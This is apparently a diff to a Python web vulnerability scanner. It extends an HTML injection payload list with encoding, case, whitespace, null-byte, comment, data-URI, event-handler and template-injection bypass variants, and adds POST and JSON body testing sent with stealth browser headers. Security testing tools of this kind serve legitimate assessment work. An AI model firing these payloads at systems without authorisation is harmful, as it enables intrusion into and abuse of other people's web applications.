@@ -69,6 +69,43 @@ HTML_PAYLOADS = [
 
     # SVG injection
     ('<svg onload="alert(1)"></svg>', "<svg", "SVG injection"),
+
+    # ── ENCODING BYPASS PAYLOADS ──────────────────────────────────────────────
+    ('&#60;h1&#62;HACKED&#60;/h1&#62;', "&#60;", "HTML entity encoding"),
+    ('&#x3C;h1&#x3E;HACKED&#x3C;/h1&#x3E;', "&#x3C;", "Hex entity encoding"),
+    ('%3Ch1%3EHACKED%3C/h1%3E', "%3C", "URL encoding"),
+    ('%26lt%3Bh1%26gt%3BHACKED%26lt%3B/h1%26gt%3B', "%26lt", "Double URL encoding"),
+
+    # ── CASE VARIATION PAYLOADS ───────────────────────────────────────────────
+    ('<H1>HACKED</H1>', "<H1>", "Uppercase tags"),
+    ('<h1>HACKED</h1>', "<h1>", "Lowercase tags"),
+    ('<Hi>hackED</Hi>', "<Hi>", "Mixed case tags"),
+
+    # ── WHITESPACE BYPASS PAYLOADS ────────────────────────────────────────────
+    ('< h1 >HACKED< /h1 >', "< h1 >", "Space in tags"),
+    ('<h1\t>HACKED</h1>', "<h1\t", "Tab in tags"),
+    ('<h1\n>HACKED</h1>', "<h1\n", "Newline in tags"),
+
+    # ── NULL BYTE BYPASS PAYLOADS ─────────────────────────────────────────────
+    ('<h1%00>HACKED</h1>', "<h1%00", "Null byte in tag"),
+
+    # ── COMMENT BYPASS PAYLOADS ───────────────────────────────────────────────
+    ('<!--><h1>HACKED</h1>-->', "<!-->", "Comment bypass"),
+    ('<!----><h1>HACKED</h1>', "<!---->", "Empty comment bypass"),
+
+    # ── DATA URI PAYLOADS ─────────────────────────────────────────────────────
+    ('<a href="data:text/html,<h1>HACKED</h1>">Click</a>', "data:text/html", "Data URI injection"),
+    ('<iframe src="data:text/html,<h1>HACKED</h1>">', "data:text/html", "Iframe data URI"),
+
+    # ── EVENT HANDLER PAYLOADS ────────────────────────────────────────────────
+    ('<h1 onmouseover="alert(1)">HACKED</h1>', "onmouseover", "Event handler injection"),
+    ('<h1 onfocus="alert(1)">HACKED</h1>', "onfocus", "Focus event injection"),
+    ('<h1 onclick="alert(1)">HACKED</h1>', "onclick", "Click event injection"),
+
+    # ── TEMPLATE INJECTION PAYLOADS ───────────────────────────────────────────
+    ('${7*7}', "49", "Template expression (Jinja2/Twig)"),
+    ('{{7*7}}', "49", "Template expression (Generic)"),
+    ('<%= 7*7 %>', "49", "ERB template injection"),
 ]
 
 
@@ -117,6 +154,7 @@ def html_injection_scanner(url: str, params: str = "") -> str:
 
     logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} params x {len(HTML_PAYLOADS)} payloads")
 
+    # ── PHASE 1: GET parameter testing ────────────────────────────────────────
     for param in param_list:
         if check_cancelled(logger): break
 
@@ -140,18 +178,91 @@ def html_injection_scanner(url: str, params: str = "") -> str:
                     vulnerabilities.append({
                         "parameter": param,
                         "payload": payload,
-                        "type": "HTML Injection (Reflected)",
+                        "type": "HTML Injection (Reflected - GET)",
                         "description": description,
                         "severity": "Medium",
                         "evidence": f"HTML payload reflected in response body",
                         "status_code": resp.status_code,
+                        "method": "GET",
                     })
                     logger.add_log(tool_name, "WARNING",
-                        f"HTML injection: param={param}, type={description}")
+                        f"HTML injection (GET): param={param}, type={description}")
                     break  # One confirmed per param is enough
 
             except Exception:
                 continue
+
+    # ── PHASE 2: POST body testing ────────────────────────────────────────────
+    logger.add_log(tool_name, "PROCESSING", "Testing POST body injection")
+    post_params = ["comment", "message", "body", "content", "text", "note", "bio", "description"]
+
+    for param in post_params:
+        if check_cancelled(logger): break
+
+        # Skip if already found vulnerable via GET
+        if any(v["parameter"] == param for v in vulnerabilities):
+            continue
+
+        for payload, indicator, description in HTML_PAYLOADS[:15]:  # Limit to top 15 for POST
+            try:
+                rate_limiter.wait(domain)
+                stealth_headers = stealth.get_browser_headers(url)
+                resp = requests.post(
+                    url,
+                    data={param: payload},
+                    headers={**stealth_headers, "Content-Type": "application/x-www-form-urlencoded"},
+                    timeout=5,
+                    verify=False,
+                    **auth_kwargs,
+                )
+                tested += 1
+
+                # Check if HTML payload is reflected unescaped
+                if payload in resp.text:
+                    vulnerabilities.append({
+                        "parameter": param,
+                        "payload": payload,
+                        "type": "HTML Injection (Reflected - POST)",
+                        "description": description,
+                        "severity": "Medium",
+                        "evidence": f"HTML payload reflected in POST response body",
+                        "status_code": resp.status_code,
+                        "method": "POST",
+                    })
+                    logger.add_log(tool_name, "WARNING",
+                        f"HTML injection (POST): param={param}, type={description}")
+                    break
+
+            except Exception:
+                continue
+
+        # Also test JSON body
+        try:
+            rate_limiter.wait(domain)
+            stealth_headers = stealth.get_browser_headers(url)
+            resp = requests.post(
+                url,
+                json={param: HTML_PAYLOADS[0][0]},  # First payload
+                headers={**stealth_headers, "Content-Type": "application/json"},
+                timeout=5,
+                verify=False,
+                **auth_kwargs,
+            )
+            tested += 1
+
+            if HTML_PAYLOADS[0][0] in resp.text:
+                vulnerabilities.append({
+                    "parameter": param,
+                    "payload": HTML_PAYLOADS[0][0],
+                    "type": "HTML Injection (JSON Body)",
+                    "description": "JSON body injection",
+                    "severity": "Medium",
+                    "evidence": f"HTML payload reflected in JSON response",
+                    "status_code": resp.status_code,
+                    "method": "POST (JSON)",
+                })
+        except Exception:
+            pass
 
     result = {
         "status": "VULNERABLE" if vulnerabilities else "SAFE",
